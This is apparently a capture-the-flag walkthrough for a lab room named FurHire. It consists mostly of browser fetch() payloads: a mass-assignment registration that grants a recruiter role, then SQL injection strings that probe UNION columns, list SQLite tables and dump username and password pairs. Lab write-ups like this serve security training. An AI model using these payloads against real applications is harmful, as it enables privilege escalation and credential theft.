## Bugforge room FurHire [https://https://app.bugforge.io)

### FurHire | Bugforge | Mass Assignment | SQL Injection | Full Walkthrough 2026: 

[FurHire | Bugforge | Mass Assignment | SQL Injection | Full Walkthrough 2026 | Full Walkthrough 2026](https://youtu.be/MzKS0lwJ3tQ)

```
fetch('/api/register', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'hacker',
    email: 'hacker@test.com',
    password: '123456',
    full_name: 'hacker',
    role: 'recruiter'
  })
}).then(r => r.json()).then(console.log)
```

## SQL Injection:

```
fetch('/api/applications/4/status', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token') // recruiter token
  },
  body: JSON.stringify({ status: "pending' OR '1'='1" })
}).then(r => r.json()).then(console.log)
```

```
// Try 1 column
body: JSON.stringify({ status: "' UNION SELECT NULL-- " })

// Try 2 columns  
body: JSON.stringify({ status: "' UNION SELECT NULL,NULL-- " })

// Try 3 columns
body: JSON.stringify({ status: "' UNION SELECT NULL,NULL,NULL-- " })

```

```
body: JSON.stringify({ status: "' UNION SELECT NULL#" })

body: JSON.stringify({ status: "' UNION SELECT NULL,NULL#" })

body: JSON.stringify({ status: "' UNION SELECT NULL--" })
```

```
body: JSON.stringify({ status: "' || (SELECT 'a')-- " })
```

## it's SQLite string concatenation

```
// List all tables in SQLite
body: JSON.stringify({ status: "' || (SELECT group_concat(name) FROM sqlite_master WHERE type='table')--" })
```
```
Users table:

body: JSON.stringify({ status: "' || (SELECT group_concat(sql) FROM sqlite_master WHERE name='users')--" })
```
```
Dump User table.

body: JSON.stringify({ status: "' || (SELECT group_concat(username||':'||password) FROM users)--" })
```


